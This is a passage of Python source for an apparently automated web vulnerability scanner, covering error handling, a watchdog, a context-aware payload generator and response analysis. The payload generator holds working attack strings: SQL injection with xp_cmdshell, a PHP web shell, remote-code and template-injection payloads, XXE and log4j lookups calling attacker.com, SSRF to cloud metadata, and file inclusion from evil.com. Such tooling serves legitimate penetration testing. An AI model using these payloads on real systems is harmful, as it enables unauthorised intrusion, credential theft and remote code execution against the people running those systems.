                recoverable=True,
                retry_after=5.0,
                message="Server error - will retry",
            )
        
        elif status_code >= 400 and status_code < 500:
            return ClassifiedError(
                original_error=error,
                category=ErrorCategory.CLIENT,
                severity=ErrorSeverity.MEDIUM,
                recoverable=False,
                message="Client error",
            )
        
        return None
    
    def _classify_by_pattern(
        self, 
        error_str: str, 
        response_body: str, 
        error: Exception
    ) -> ClassifiedError:
        """Classify based on error message patterns."""
        combined = f"{error_str} {response_body}"
        
        # Check transient patterns
        for pattern in self.TRANSIENT_PATTERNS:
            if re.search(pattern, combined):
                return ClassifiedError(
                    original_error=error,
                    category=ErrorCategory.TRANSIENT,
                    severity=ErrorSeverity.MEDIUM,
                    recoverable=True,
                    retry_after=2.0,
                    message="Transient error - will retry",
                )
        
        # Check rate limit patterns
        for pattern in self.RATE_LIMIT_PATTERNS:
            if re.search(pattern, combined):
                return ClassifiedError(
                    original_error=error,
                    category=ErrorCategory.RATE_LIMIT,
                    severity=ErrorSeverity.MEDIUM,
                    recoverable=True,
                    retry_after=30.0,
                    message="Rate limited",
                )
        
        # Check auth patterns
        for pattern in self.AUTH_PATTERNS:
            if re.search(pattern, combined):
                return ClassifiedError(
                    original_error=error,
                    category=ErrorCategory.AUTH,
                    severity=ErrorSeverity.HIGH,
                    recoverable=False,
                    message="Authentication issue",
                )
        
        # Check permanent patterns
        for pattern in self.PERMANENT_PATTERNS:
            if re.search(pattern, combined):
                return ClassifiedError(
                    original_error=error,
                    category=ErrorCategory.PERMANENT,
                    severity=ErrorSeverity.LOW,
                    recoverable=False,
                    skip_endpoint=True,
                    message="Permanent error",
                )
        
        # Check for timeout
        if isinstance(error, (asyncio.TimeoutError, httpx.TimeoutException)):
            return ClassifiedError(
                original_error=error,
                category=ErrorCategory.TIMEOUT,
                severity=ErrorSeverity.MEDIUM,
                recoverable=True,
                retry_after=5.0,
                message="Operation timed out",
            )
        
        # Check for network errors
        if isinstance(error, (httpx.ConnectError, httpx.ReadError, ConnectionError)):
            return ClassifiedError(
                original_error=error,
                category=ErrorCategory.NETWORK,
                severity=ErrorSeverity.HIGH,
                recoverable=True,
                retry_after=10.0,
                message="Network connectivity issue",
            )
        
        # Default: unknown
        return ClassifiedError(
            original_error=error,
            category=ErrorCategory.UNKNOWN,
            severity=ErrorSeverity.MEDIUM,
            recoverable=True,
            retry_after=5.0,
            message="Unknown error",
        )
    
    def _finalize_classification(
        self, 
        classified: ClassifiedError, 
        endpoint: str = None
    ) -> ClassifiedError:
        """Finalize classification with endpoint-specific logic."""
        if endpoint:
            self._endpoint_failures[endpoint] = self._endpoint_failures.get(endpoint, 0) + 1
            
            # Auto-skip if too many failures
            if self._endpoint_failures[endpoint] >= self._auto_skip_threshold:
                classified.skip_endpoint = True
                classified.message += f" (auto-skipped after {self._auto_skip_threshold} failures)"
        
        self._error_history.append(classified)
        return classified
    
    def should_skip_endpoint(self, endpoint: str) -> bool:
        """Check if an endpoint should be skipped."""
        return self._endpoint_failures.get(endpoint, 0) >= self._auto_skip_threshold
    
    def reset_endpoint(self, endpoint: str):
        """Reset failure count for an endpoint."""
        self._endpoint_failures[endpoint] = 0
    
    def get_retry_strategy(self, classified: ClassifiedError) -> Dict[str, Any]:
        """Get recommended retry strategy for an error."""
        if not classified.recoverable:
            return {"should_retry": False}
        
        base_strategies = {
            ErrorCategory.TRANSIENT: {
                "should_retry": True,
                "max_retries": 3,
                "backoff": "exponential",
                "base_delay": 1.0,
            },
            ErrorCategory.RATE_LIMIT: {
                "should_retry": True,
                "max_retries": 5,
                "backoff": "linear",
                "base_delay": classified.retry_after,
            },
            ErrorCategory.TIMEOUT: {
                "should_retry": True,
                "max_retries": 2,
                "backoff": "exponential",
                "base_delay": 2.0,
            },
            ErrorCategory.NETWORK: {
                "should_retry": True,
                "max_retries": 3,
                "backoff": "exponential",
                "base_delay": 5.0,
            },
            ErrorCategory.SERVER: {
                "should_retry": True,
                "max_retries": 2,
                "backoff": "exponential",
                "base_delay": 5.0,
            },
        }
        
        return base_strategies.get(classified.category, {"should_retry": False})
    
    def get_stats(self) -> Dict[str, Any]:
        """Get error classification statistics."""
        category_counts = {}
        for err in self._error_history:
            cat = err.category.value
            category_counts[cat] = category_counts.get(cat, 0) + 1
        
        return {
            "total_errors": len(self._error_history),
            "by_category": category_counts,
            "endpoints_with_failures": len(self._endpoint_failures),
            "auto_skipped_endpoints": sum(
                1 for v in self._endpoint_failures.values() 
                if v >= self._auto_skip_threshold
            ),
        }


class DeadLetterQueue:
    """Queue for failed operations to retry later."""
    
    def __init__(self, max_size: int = 100, max_retries: int = 3):
        self.max_size = max_size
        self.max_retries = max_retries
        self._queue: Dict[str, DeadLetterItem] = {}
        self._processed: Set[str] = set()
    
    def add(
        self,
        operation: str,
        target: str,
        payload: str,
        error: ClassifiedError
    ) -> Optional[str]:
        """Add a failed operation to the queue."""
        if len(self._queue) >= self.max_size:
            # Remove oldest item
            oldest_key = min(self._queue, key=lambda k: self._queue[k].created_at)
            del self._queue[oldest_key]
        
        item_id = hashlib.md5(f"{operation}:{target}:{payload}".encode()).hexdigest()[:12]
        
        # Check if already in queue
        if item_id in self._queue:
            existing = self._queue[item_id]
            existing.attempts += 1
            existing.last_attempt = time.time()
            existing.next_retry = time.time() + (error.retry_after * existing.attempts)
            return item_id
        
        # Add new item
        now = time.time()
        self._queue[item_id] = DeadLetterItem(
            id=item_id,
            operation=operation,
            target=target,
            payload=payload,
            error=error,
            attempts=1,
            created_at=now,
            last_attempt=now,
            next_retry=now + error.retry_after,
        )
        
        return item_id
    
    def get_ready_items(self) -> List[DeadLetterItem]:
        """Get items ready for retry."""
        now = time.time()
        ready = []
        
        for item in self._queue.values():
            if item.next_retry <= now and item.attempts < self.max_retries:
                ready.append(item)
        
        return sorted(ready, key=lambda x: x.next_retry)
    
    def mark_processed(self, item_id: str, success: bool):
        """Mark an item as processed."""
        if success:
            self._queue.pop(item_id, None)
            self._processed.add(item_id)
        else:
            if item_id in self._queue:
                self._queue[item_id].attempts += 1
                self._queue[item_id].last_attempt = time.time()
    
    def remove_expired(self, max_age: float = 3600):
        """Remove items older than max_age seconds."""
        now = time.time()
        expired = [
            k for k, v in self._queue.items()
            if now - v.created_at > max_age or v.attempts >= self.max_retries
        ]
        for k in expired:
            del self._queue[k]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get queue statistics."""
        return {
            "queue_size": len(self._queue),
            "processed_count": len(self._processed),
            "ready_for_retry": len(self.get_ready_items()),
            "max_size": self.max_size,
        }


# =============================================================================
# WATCHDOG & SELF-HEALING SYSTEM
# =============================================================================

@dataclass
class HealthMetrics:
    """Health metrics for monitoring."""
    cpu_percent: float = 0.0
    memory_percent: float = 0.0
    active_tasks: int = 0
    pending_requests: int = 0
    error_rate: float = 0.0
    avg_response_time: float = 0.0
    last_update: float = field(default_factory=time.time)


@dataclass
class Checkpoint:
    """A checkpoint for session state."""
    id: str
    session_id: str
    timestamp: float
    iteration: int
    state: Dict[str, Any]
    findings_count: int
    phase: str


class Watchdog:
    """Background health monitor and self-healing system."""
    
    def __init__(self):
        self._running: bool = False
        self._task: Optional[asyncio.Task] = None
        self._health_metrics = HealthMetrics()
        self._checkpoints: Dict[str, List[Checkpoint]] = {}  # session_id -> checkpoints
        self._max_checkpoints_per_session: int = 10
        self._hung_operation_timeout: float = 300.0  # 5 minutes - allows for long LLM calls (120s each)
        self._active_operations: Dict[str, float] = {}  # operation_id -> start_time
        self._operation_callbacks: Dict[str, asyncio.Event] = {}
        self._alerts: List[Dict[str, Any]] = []
        self._recovery_actions: List[Dict[str, Any]] = []
        
        # Thresholds
        self._memory_threshold: float = 85.0  # percent
        self._error_rate_threshold: float = 0.5  # 50% errors
        self._response_time_threshold: float = 30.0  # seconds
    
    async def start(self):
        """Start the watchdog background task."""
        if self._running:
            return
        
        self._running = True
        self._task = asyncio.create_task(self._monitor_loop())
        logger.info("Watchdog started")
    
    async def stop(self):
        """Stop the watchdog."""
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        logger.info("Watchdog stopped")
    
    async def _monitor_loop(self):
        """Main monitoring loop."""
        while self._running:
            try:
                await self._update_health_metrics()
                await self._check_hung_operations()
                await self._check_resource_usage()
                await asyncio.sleep(5)  # Check every 5 seconds
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Watchdog error: {e}")
                await asyncio.sleep(10)
    
    async def _update_health_metrics(self):
        """Update health metrics."""
        try:
            import psutil
            self._health_metrics.cpu_percent = psutil.cpu_percent()
            self._health_metrics.memory_percent = psutil.virtual_memory().percent
        except ImportError:
            pass  # psutil not available
        
        self._health_metrics.active_tasks = len(self._active_operations)
        self._health_metrics.last_update = time.time()
    
    async def _check_hung_operations(self):
        """Check for and handle hung operations."""
        now = time.time()
        hung_ops = []
        
        for op_id, start_time in list(self._active_operations.items()):
            if now - start_time > self._hung_operation_timeout:
                hung_ops.append(op_id)
        
        for op_id in hung_ops:
            await self._handle_hung_operation(op_id)
    
    async def _handle_hung_operation(self, operation_id: str):
        """Handle a hung operation with graceful recovery."""
        logger.warning(f"Hung operation detected: {operation_id} - initiating recovery")
        
        # Signal the operation to cancel
        if operation_id in self._operation_callbacks:
            self._operation_callbacks[operation_id].set()
        
        # Record alert with more detail
        self._alerts.append({
            "type": "hung_operation",
            "operation_id": operation_id,
            "timestamp": time.time(),
            "action": "recovery_initiated",
            "message": "Operation timed out - attempting graceful recovery",
        })
        
        # Give the operation a moment to respond to cancellation
        await asyncio.sleep(2)
        
        # Clean up
        self._active_operations.pop(operation_id, None)
        self._operation_callbacks.pop(operation_id, None)
        
        # Record recovery action
        self._recovery_actions.append({
            "type": "cancel_hung_operation",
            "operation_id": operation_id,
            "timestamp": time.time(),
            "recovery_type": "graceful_cancel",
        })
        
        logger.info(f"Hung operation {operation_id} cleanup complete")
    
    async def _check_resource_usage(self):
        """Check resource usage and take action if needed."""
        if self._health_metrics.memory_percent > self._memory_threshold:
            await self._handle_high_memory()
        
        if self._health_metrics.error_rate > self._error_rate_threshold:
            await self._handle_high_error_rate()
    
    async def _handle_high_memory(self):
        """Handle high memory usage."""
        logger.warning(f"High memory usage: {self._health_metrics.memory_percent}%")
        
        self._alerts.append({
            "type": "high_memory",
            "value": self._health_metrics.memory_percent,
            "timestamp": time.time(),
        })
        
        # Force garbage collection
        import gc
        gc.collect()
        
        self._recovery_actions.append({
            "type": "gc_collect",
            "timestamp": time.time(),
        })
    
    async def _handle_high_error_rate(self):
        """Handle high error rate."""
        logger.warning(f"High error rate: {self._health_metrics.error_rate}")
        
        self._alerts.append({
            "type": "high_error_rate",
            "value": self._health_metrics.error_rate,
            "timestamp": time.time(),
        })
    
    def register_operation(self, operation_id: str) -> asyncio.Event:
        """Register an operation for monitoring."""
        self._active_operations[operation_id] = time.time()
        cancel_event = asyncio.Event()
        self._operation_callbacks[operation_id] = cancel_event
        return cancel_event
    
    def update_activity(self, operation_id: str):
        """Update the activity timestamp for an operation to prevent hung detection."""
        if operation_id in self._active_operations:
            self._active_operations[operation_id] = time.time()
    
    def complete_operation(self, operation_id: str, success: bool = True):
        """Mark an operation as complete."""
        self._active_operations.pop(operation_id, None)
        self._operation_callbacks.pop(operation_id, None)
        
        # Update error rate (simple moving average)
        error_val = 0.0 if success else 1.0
        self._health_metrics.error_rate = (
            0.9 * self._health_metrics.error_rate + 0.1 * error_val
        )
    
    def create_checkpoint(self, session_id: str, session_state: Dict[str, Any]) -> Checkpoint:
        """Create a checkpoint for a session."""
        checkpoint = Checkpoint(
            id=str(uuid.uuid4())[:8],
            session_id=session_id,
            timestamp=time.time(),
            iteration=session_state.get("iterations", 0),
            state=session_state,
            findings_count=len(session_state.get("findings", [])),
            phase=session_state.get("current_phase", "unknown"),
        )
        
        if session_id not in self._checkpoints:
            self._checkpoints[session_id] = []
        
        self._checkpoints[session_id].append(checkpoint)
        
        # Keep only last N checkpoints
        if len(self._checkpoints[session_id]) > self._max_checkpoints_per_session:
            self._checkpoints[session_id] = self._checkpoints[session_id][-self._max_checkpoints_per_session:]
        
        logger.debug(f"Checkpoint created for session {session_id}: iteration {checkpoint.iteration}")
        return checkpoint
    
    def get_latest_checkpoint(self, session_id: str) -> Optional[Checkpoint]:
        """Get the latest checkpoint for a session."""
        checkpoints = self._checkpoints.get(session_id, [])
        return checkpoints[-1] if checkpoints else None
    
    def restore_from_checkpoint(self, session_id: str, checkpoint_id: str = None) -> Optional[Dict[str, Any]]:
        """Restore session state from a checkpoint."""
        checkpoints = self._checkpoints.get(session_id, [])
        
        if not checkpoints:
            return None
        
        if checkpoint_id:
            for cp in checkpoints:
                if cp.id == checkpoint_id:
                    return cp.state
            return None
        
        # Return latest
        return checkpoints[-1].state
    
    def update_response_time(self, response_time: float):
        """Update average response time metric."""
        self._health_metrics.avg_response_time = (
            0.9 * self._health_metrics.avg_response_time + 0.1 * response_time
        )
    
    def get_health(self) -> Dict[str, Any]:
        """Get current health status."""
        status = "healthy"
        issues = []
        
        if self._health_metrics.memory_percent > self._memory_threshold:
            status = "degraded"
            issues.append(f"High memory: {self._health_metrics.memory_percent:.1f}%")
        
        if self._health_metrics.error_rate > self._error_rate_threshold:
            status = "unhealthy"
            issues.append(f"High error rate: {self._health_metrics.error_rate:.1%}")
        
        if self._health_metrics.avg_response_time > self._response_time_threshold:
            status = "degraded"
            issues.append(f"Slow responses: {self._health_metrics.avg_response_time:.1f}s")
        
        return {
            "status": status,
            "metrics": {
                "cpu_percent": self._health_metrics.cpu_percent,
                "memory_percent": self._health_metrics.memory_percent,
                "active_tasks": self._health_metrics.active_tasks,
                "error_rate": self._health_metrics.error_rate,
                "avg_response_time": self._health_metrics.avg_response_time,
            },
            "issues": issues,
            "alerts_count": len(self._alerts),
            "recovery_actions_count": len(self._recovery_actions),
            "checkpoints_sessions": len(self._checkpoints),
        }
    
    def get_alerts(self, limit: int = 20) -> List[Dict[str, Any]]:
        """Get recent alerts."""
        return self._alerts[-limit:]
    
    def get_recovery_actions(self, limit: int = 20) -> List[Dict[str, Any]]:
        """Get recent recovery actions."""
        return self._recovery_actions[-limit:]
    
    def clear_alerts(self):
        """Clear all alerts."""
        self._alerts.clear()
        self._recovery_actions.clear()


# Global instances for advanced robustness
_graceful_degradation = GracefulDegradation()
_error_classifier = ErrorClassifier()
_dead_letter_queue = DeadLetterQueue()
_watchdog = Watchdog()


# =============================================================================
# CONTEXT-AWARE PAYLOAD GENERATION
# =============================================================================

class ParameterType(str, Enum):
    """Inferred parameter types for smart payload generation."""
    STRING = "string"
    INTEGER = "integer"
    FLOAT = "float"
    BOOLEAN = "boolean"
    EMAIL = "email"
    URL = "url"
    DATE = "date"
    DATETIME = "datetime"
    PHONE = "phone"
    UUID = "uuid"
    JSON = "json"
    XML = "xml"
    FILE_PATH = "file_path"
    SQL_LIKE = "sql_like"
    HTML = "html"
    BASE64 = "base64"
    JWT = "jwt"
    PASSWORD = "password"
    USERNAME = "username"
    SEARCH = "search"
    ID = "id"
    UNKNOWN = "unknown"


@dataclass
class ParameterContext:
    """Context information about a parameter for smart payload generation."""
    name: str
    inferred_type: ParameterType
    sample_value: Optional[str] = None
    constraints: Dict[str, Any] = field(default_factory=dict)  # min, max, pattern, etc.
    position: str = "query"  # query, body, header, path
    encoding: Optional[str] = None  # json, xml, form, etc.
    technology_hints: List[str] = field(default_factory=list)


class ContextAwarePayloadGenerator:
    """Generate smart payloads based on parameter context and technology."""
    
    # Parameter name patterns for type inference
    TYPE_PATTERNS = {
        ParameterType.EMAIL: [r"email", r"e-mail", r"mail", r"correo"],
        ParameterType.URL: [r"url", r"uri", r"link", r"href", r"redirect", r"callback", r"next", r"return"],
        ParameterType.DATE: [r"date", r"fecha", r"dob", r"birth"],
        ParameterType.DATETIME: [r"datetime", r"timestamp", r"created", r"updated", r"time"],
        ParameterType.PHONE: [r"phone", r"tel", r"mobile", r"cell", r"fax"],
        ParameterType.UUID: [r"uuid", r"guid", r"token"],
        ParameterType.FILE_PATH: [r"file", r"path", r"filename", r"filepath", r"document", r"upload"],
        ParameterType.PASSWORD: [r"pass", r"pwd", r"secret", r"credential"],
        ParameterType.USERNAME: [r"user", r"login", r"account", r"nick"],
        ParameterType.SEARCH: [r"search", r"query", r"q", r"keyword", r"term", r"find"],
        ParameterType.ID: [r"id$", r"_id$", r"Id$", r"ID$", r"key", r"ref"],
        ParameterType.INTEGER: [r"count", r"num", r"amount", r"quantity", r"size", r"limit", r"offset", r"page"],
        ParameterType.BOOLEAN: [r"is_", r"has_", r"can_", r"enable", r"disable", r"active", r"flag"],
        ParameterType.JSON: [r"json", r"data", r"payload", r"body", r"config"],
        ParameterType.XML: [r"xml", r"soap"],
        ParameterType.HTML: [r"html", r"content", r"message", r"comment", r"description", r"bio"],
        ParameterType.BASE64: [r"base64", r"encoded", r"b64"],
        ParameterType.JWT: [r"jwt", r"bearer", r"auth_token", r"access_token"],
    }
    
    # Technology-specific payload modifications
    TECH_PAYLOADS = {
        "php": {
            "sqli": ["' OR '1'='1'--", "1' AND SLEEP(5)#", "admin'/*"],
            "rce": ["<?php system($_GET['cmd']); ?>", ";phpinfo();", "${system('id')}"],
            "lfi": ["php://filter/convert.base64-encode/resource=", "php://input", "expect://id"],
            "ssti": ["<?=$_GET[0]?>", "${7*7}"],
        },
        "nodejs": {
            "sqli": ["'; process.exit();//", "1; return true;//"],
            "rce": ["require('child_process').exec('id')", "eval(Buffer.from('','base64'))"],
            "nosqli": ["{'$gt': ''}", '{"$ne": null}', '{"$regex": ".*"}'],
            "ssti": ["#{7*7}", "{{constructor.constructor('return this')()}}"],
            "prototype": ["__proto__[admin]=1", "constructor.prototype.admin=1"],
        },
        "python": {
            "sqli": ["' OR 1=1--", "'; import os; os.system('id')#"],
            "rce": ["__import__('os').system('id')", "eval(compile('','','exec'))"],
            "ssti": ["{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{request.application.__globals__}}"],
            "pickle": ["cos\nsystem\n(S'id'\ntR."],
        },
        "java": {
            "sqli": ["' OR '1'='1'--", "1' AND 1=1--"],
            "rce": ["${T(java.lang.Runtime).getRuntime().exec('id')}", "#{T(java.lang.Runtime).getRuntime().exec('id')}"],
            "ssti": ["${7*7}", "*{T(java.lang.Runtime).getRuntime().exec('id')}"],
            "deserialization": ["rO0AB", "aced0005"],
            "log4j": ["${jndi:ldap://attacker.com/a}", "${${lower:j}ndi:ldap://}"],
        },
        "aspnet": {
            "sqli": ["'; WAITFOR DELAY '0:0:5'--", "1; EXEC xp_cmdshell 'whoami'--"],
            "rce": ["<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd\");%>"],
            "viewstate": ["__VIEWSTATE=", "__EVENTVALIDATION="],
        },
        "ruby": {
            "sqli": ["' OR '1'='1'--"],
            "rce": ["`id`", "system('id')", "exec('id')", "%x(id)"],
            "ssti": ["<%= system('id') %>", "#{`id`}"],
            "deserialization": ["--- !ruby/object:Gem::Installer"],
        },
    }
    
    # Parameter-type specific payloads
    PARAM_TYPE_PAYLOADS = {
        ParameterType.EMAIL: {
            "sqli": ["admin'--@test.com", "' OR 1=1--@x.com", "test@test.com' AND '1'='1"],
            "xss": ["<script>alert(1)</script>@test.com", "test@test.com\"><img src=x>"],
            "header_injection": ["test@test.com\r\nBcc: attacker@evil.com"],
        },
        ParameterType.URL: {
            "ssrf": ["http://localhost", "http://127.0.0.1", "http://[::1]", 
                     "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd",
                     "http://0.0.0.0", "http://127.1", "http://2130706433"],
            "open_redirect": ["//evil.com", "https://evil.com", "/\\evil.com", 
                              "javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
            "path_traversal": ["../../../etc/passwd", "..\\..\\windows\\system32\\config\\sam"],
        },
        ParameterType.FILE_PATH: {
            "path_traversal": ["../../../etc/passwd", "....//....//etc/passwd",
                               "..%252f..%252f..%252fetc/passwd", "..%c0%af..%c0%afetc/passwd"],
            "lfi": ["/etc/passwd", "/proc/self/environ", "/var/log/apache2/access.log"],
            "rfi": ["http://evil.com/shell.txt", "\\\\evil.com\\share\\shell.txt"],
        },
        ParameterType.SEARCH: {
            "sqli": ["' OR '1'='1", "' UNION SELECT NULL--", "1' AND SLEEP(5)--"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "nosqli": ['{"$regex": ".*"}', '{"$gt": ""}'],
            "ldap": ["*)(uid=*))(|(uid=*", "admin)(|(password=*))"],
        },
        ParameterType.ID: {
            "idor": ["-1", "0", "99999999", "1 OR 1=1", "../1", "1;2;3"],
            "sqli": ["1 OR 1=1", "1' OR '1'='1", "1 UNION SELECT NULL--"],
            "nosqli": ['{"$ne": -1}', '{"$gt": 0}'],
        },
        ParameterType.JSON: {
            "injection": ['{"__proto__": {"admin": true}}', '{"constructor": {"prototype": {"admin": true}}}'],
            "sqli": ['{"id": "1 OR 1=1"}', '{"$where": "this.a == this.b"}'],
            "xxe": ['{"xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]>"}'],
        },
        ParameterType.XML: {
            "xxe": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'],
            "injection": ['<![CDATA[<script>alert(1)</script>]]>'],
        },
        ParameterType.HTML: {
            "xss": ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
                    '"><script>alert(1)</script>', "'-alert(1)-'", '<body onload=alert(1)>'],
            "ssti": ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}'],
        },
        ParameterType.INTEGER: {
            "sqli": ["1 OR 1=1", "1; DROP TABLE users--", "1 AND SLEEP(5)"],
            "overflow": ["-1", "0", "2147483647", "-2147483648", "9999999999999"],
            "format_string": ["%s%s%s%s%s", "%n%n%n%n%n", "%x%x%x%x"],
        },
        ParameterType.PASSWORD: {
            "sqli": ["' OR '1'='1", "admin'--", "' OR 1=1#"],
            "bypass": ["admin", "password", "123456", "' OR ''='"],
        },
        ParameterType.JWT: {
            "bypass": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
                       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0."],
            "confusion": ["alg:none", "alg:HS256->RS256"],
        },
    }
    
    def __init__(self):
        self._learned_patterns: Dict[str, List[str]] = {}  # successful payloads by context
        self._bypass_mutations: List[str] = []
    
    def infer_parameter_type(self, param_name: str, sample_value: str = None) -> ParameterType:
        """Infer parameter type from name and optional sample value."""
        param_lower = param_name.lower()
        
        # Check name patterns
        for param_type, patterns in self.TYPE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, param_lower, re.IGNORECASE):
                    return param_type
        
        # Check sample value format
        if sample_value:
            if re.match(r'^[\w.-]+@[\w.-]+\.\w+$', sample_value):
                return ParameterType.EMAIL
            if re.match(r'^https?://', sample_value):
                return ParameterType.URL
            if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', sample_value, re.I):
                return ParameterType.UUID
            if re.match(r'^\d+$', sample_value):
                return ParameterType.INTEGER
            if re.match(r'^\d+\.\d+$', sample_value):
                return ParameterType.FLOAT
            if sample_value.lower() in ('true', 'false', '0', '1'):
                return ParameterType.BOOLEAN
            if sample_value.startswith('{') or sample_value.startswith('['):
                return ParameterType.JSON
            if sample_value.startswith('<') and sample_value.endswith('>'):
                return ParameterType.XML
            if re.match(r'^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$', sample_value):
                return ParameterType.JWT
        
        return ParameterType.STRING
    
    def generate_payloads(
        self,
        param_context: ParameterContext,
        technique: str,
        technology: str = None,
        max_payloads: int = 50,
        use_comprehensive_wordlists: bool = True
    ) -> List[str]:
        """Generate context-aware payloads for a parameter.
        
        Args:
            param_context: Context information about the parameter
            technique: Attack technique (sqli, xss, etc.)
            technology: Detected technology stack (optional)
            max_payloads: Maximum number of payloads to return
            use_comprehensive_wordlists: Whether to use the comprehensive wordlist service
        
        Returns:
            List of payloads appropriate for the context
        """
        payloads = []
        
        # First, try to get payloads from comprehensive wordlist service
        if use_comprehensive_wordlists and WORDLIST_SERVICE_AVAILABLE:
            try:
                # Get comprehensive payloads from wordlist service
                wordlist_payloads = get_wordlist_payloads(technique, limit=max_payloads * 2)
                if wordlist_payloads:
                    payloads.extend(wordlist_payloads)
                    logger.debug(f"Loaded {len(wordlist_payloads)} payloads from wordlist service for {technique}")
            except Exception as e:
                logger.warning(f"Failed to load wordlist payloads: {e}")
        
        # Get type-specific payloads (these are more targeted)
        type_payloads = self.PARAM_TYPE_PAYLOADS.get(param_context.inferred_type, {})
        technique_payloads = type_payloads.get(technique, [])
        payloads.extend(technique_payloads)
        
        # Get technology-specific payloads
        if technology:
            tech_lower = technology.lower()
            for tech_key, tech_data in self.TECH_PAYLOADS.items():
                if tech_key in tech_lower:
                    tech_technique_payloads = tech_data.get(technique, [])
                    payloads.extend(tech_technique_payloads)
        
        # Add learned successful patterns
        context_key = f"{param_context.inferred_type.value}:{technique}"
        if context_key in self._learned_patterns:
            payloads.extend(self._learned_patterns[context_key][:5])
        
        # Apply mutations based on parameter encoding
        if param_context.encoding == "json":
            payloads = self._json_encode_payloads(payloads)
        elif param_context.encoding == "xml":
            payloads = self._xml_encode_payloads(payloads)
        
        # Deduplicate and limit
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)
        
        # Prioritize type-specific and technology-specific payloads at the front
        # These are more likely to succeed as they're context-aware
        return unique_payloads[:max_payloads]
    
    def _json_encode_payloads(self, payloads: List[str]) -> List[str]:
        """Encode payloads for JSON context."""
        encoded = []
        for p in payloads:
            encoded.append(p)
            # Add JSON-escaped version
            escaped = p.replace('\\', '\\\\').replace('"', '\\"')
            if escaped != p:
                encoded.append(escaped)
        return encoded
    
    def _xml_encode_payloads(self, payloads: List[str]) -> List[str]:
        """Encode payloads for XML context."""
        encoded = []
        for p in payloads:
            encoded.append(p)
            # Add XML-encoded version
            xml_encoded = p.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            if xml_encoded != p:
                encoded.append(xml_encoded)
        return encoded
    
    def learn_successful_payload(self, param_context: ParameterContext, technique: str, payload: str):
        """Learn from a successful payload for future use."""
        context_key = f"{param_context.inferred_type.value}:{technique}"
        if context_key not in self._learned_patterns:
            self._learned_patterns[context_key] = []
        if payload not in self._learned_patterns[context_key]:
            self._learned_patterns[context_key].append(payload)
            # Keep only top 20 per context
            self._learned_patterns[context_key] = self._learned_patterns[context_key][-20:]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get payload generator statistics."""
        return {
            "learned_patterns": {k: len(v) for k, v in self._learned_patterns.items()},
            "total_learned": sum(len(v) for v in self._learned_patterns.values()),
        }


# =============================================================================
# RESPONSE ANALYSIS INTELLIGENCE
# =============================================================================

@dataclass
class ResponseFingerprint:
    """Fingerprint of an HTTP response for comparison."""
    status_code: int
    content_length: int
    content_hash: str
    headers_hash: str
    word_count: int
    line_count: int
    response_time_ms: float
    error_patterns: List[str]
    reflection_points: List[str]


@dataclass
class AnalysisResult:
    """Result from intelligent response analysis."""
    is_anomaly: bool
    anomaly_type: Optional[str] = None
    confidence: float = 0.0
    details: Dict[str, Any] = field(default_factory=dict)
    potential_vulns: List[str] = field(default_factory=list)


class ResponseAnalyzer:
    """Intelligent response analysis for vulnerability detection."""
    
    # Error patterns that indicate vulnerabilities
    ERROR_PATTERNS = {
        "sqli": [
            r"sql syntax", r"mysql_", r"mysqli_", r"pg_", r"sqlite_",
            r"ORA-\d+", r"oracle", r"SQL Server", r"ODBC", r"SQLite3::",
            r"unterminated quoted string", r"quoted string not properly terminated",
            r"You have an error in your SQL syntax",
            r"Warning: mysql_", r"Warning: pg_", r"valid MySQL result",
            r"PostgreSQL.*ERROR", r"Driver.*SQL.*Server",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark", r"SQLSTATE\[",
        ],
        "xss": [
            r"<script.*?>.*?</script>", r"javascript:", r"onerror\s*=",
            r"onload\s*=", r"onclick\s*=", r"onmouseover\s*=",
        ],
        "path_traversal": [
            r"root:.*:0:0:", r"\[boot loader\]", r"\[operating systems\]",
            r"No such file or directory", r"failed to open stream",
            r"include\(.*\): failed", r"Warning: file_get_contents",
        ],
        "rce": [
            r"uid=\d+.*gid=\d+", r"Linux.*GNU", r"Windows NT",
            r"sh: .* not found", r"'.*' is not recognized",
            r"Cannot execute", r"Permission denied",
        ],
        "ssti": [
            r"TemplateSyntaxError", r"UndefinedError", r"Jinja2",
            r"django\.template", r"freemarker\.core", r"velocity",
            r"49", r"7777777",  # Result of 7*7 or 7*7*7*7*7*7*7
        ],
        "xxe": [
            r"root:.*:0:0:", r"SYSTEM.*ENTITY", r"<!DOCTYPE",
            r"External entity", r"XML parsing error",
        ],
        "info_disclosure": [
            r"stack trace", r"at line \d+", r"Exception in thread",
            r"Traceback \(most recent", r"Debug mode:",
            r"PHP Warning:", r"PHP Notice:", r"PHP Fatal error:",
            r"/home/\w+/", r"/var/www/", r"C:\\\\Users\\\\",
            r"password", r"secret", r"api.?key", r"token",
        ],
        "ssrf": [
            r"Connection refused", r"couldn't connect to host",
            r"Name or service not known", r"No route to host",
        ],
    }
    
